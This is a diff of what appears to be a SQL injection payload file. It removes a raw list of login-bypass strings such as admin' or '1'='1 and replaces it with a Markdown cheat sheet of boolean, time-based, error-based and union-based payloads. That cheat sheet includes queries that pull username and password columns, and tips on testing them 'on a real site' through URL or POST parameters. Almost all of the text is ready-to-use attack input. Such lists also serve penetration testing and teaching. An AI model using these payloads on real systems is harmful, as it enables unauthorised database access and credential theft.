@@ -1,77 +1,34 @@
-this is quick some payloads for SQLi'
-'&'
-'^'
-'*'
-' or ''-'
-' or '' '
-' or ''&'
-' or ''^'
-' or ''*'
-"-"
-" "
-"&"
-"^"
-"*"
-" or ""-"
-" or "" "
-" or ""&"
-" or ""^"
-" or ""*"
-or true--
-" or true--
-' or true--
-") or true--
-') or true--
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-or 1=1
-or 1=1-- 
-or 1=1#
-or 1=1/*
-admin' --
-admin' #
-admin'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', 'cdw32f204dfew2bd8ewfgt13ed055
-admin" --
-admin" #
-admin"/*
-admin" or "1"="1
-admin" or "1"="1"--
-admin" or "1"="1"#
-admin" or "1"="1"/*
-admin"or 1=1 or ""="
-admin" or 1=1
-admin" or 1=1--
-admin" or 1=1#
-admin" or 1=1/*
-admin") or ("1"="1
-admin") or ("1"="1"--
-admin") or ("1"="1"#
-admin") or ("1"="1"/*
-admin") or "1"="1
-admin") or "1"="1"--
-admin") or "1"="1"#
-admin") or "1"="1"/*
-1234 " AND 1=0 UNION ALL SELECT "admin", "cdw32f204dfew2bd8ewfgt13ed055
-<!---
+# SQL Injection Payloads
+
+## Boolean-Based SQL Injection
+These payloads work by causing the SQL query to return a true or false value, allowing you to infer information about the database structure.
+
+- `' OR 1=1--`
+- `' OR 'x'='x`
+- `') OR ('1'='1`
+- `' OR 1=1#`
+
+## Time-Based SQL Injection
+These payloads use time delays to confirm if an SQL injection vulnerability exists. If the server responds after a noticeable delay, the vulnerability is confirmed.
+
+- `' OR IF(1=1, SLEEP(5), 0)--`
+- `' OR IF(1=1, SLEEP(10), 0)#`
+- `' OR 1=1 WAITFOR DELAY '0:0:5'--`
+
+## Error-Based SQL Injection
+These payloads are used to force the database to return error messages, which can reveal valuable information about the database structure.
+
+- `' AND 1=CONVERT(int, (SELECT @@version))--`
+- `' UNION SELECT NULL, NULL, NULL, version()--`
+- `' AND 1=1 GROUP BY CONCAT(username,0x3a,password)--`
+
+## Union-Based SQL Injection
+This type of SQLi allows you to combine the results of two or more queries.
+
+- `' UNION SELECT null, username, password FROM users--`
+- `' UNION SELECT 1, @@version--`
+- `' UNION SELECT null, null, user(), database()--`
+
+## Tips for Usage
+- Replace `username`, `password`, or `version()` with actual column names when testing on a real site.
+- Test each payload in the URL or POST parameters based on how the application interacts with the database.
